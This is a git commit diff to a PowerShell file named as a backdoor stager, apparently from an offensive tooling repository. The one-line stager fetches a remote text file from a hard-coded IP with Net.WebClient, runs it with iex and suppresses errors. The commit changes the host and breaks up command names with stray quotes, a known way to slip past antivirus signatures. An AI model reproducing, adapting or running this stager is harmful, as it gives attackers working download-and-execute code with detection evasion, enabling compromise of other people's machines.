958eefed55ef82591ae859f69fceb1d3d3994bf8
luigi.capuzzello <luigi.capuzzello@gmail.com>
2026-02-23 15:56:47 -0500

    update

--- backdoor/stager-OFF/07.STAGER-OFF.ps1
+++ backdoor/stager-OFF/07.STAGER-OFF.ps1
@@ -1,1 +1,1 @@
-${g}=[char[]](New-Object Net.WebClient).DownloadString('http://151.61.206.201/second.txt');iex(${g}-join'');&{Start-Sleep -s 1.2;$ErrorActionPreference='SilentlyContinue'}
+${g}=[char[]](New-Object Net.WebClient).DownloadString('http://192.168.1.11/second.txt');i''e""x(${g}-join'');&{S""ta''rt-""Sle''ep -s 1.2;$ErrorActionPreference='SilentlyContinue'}
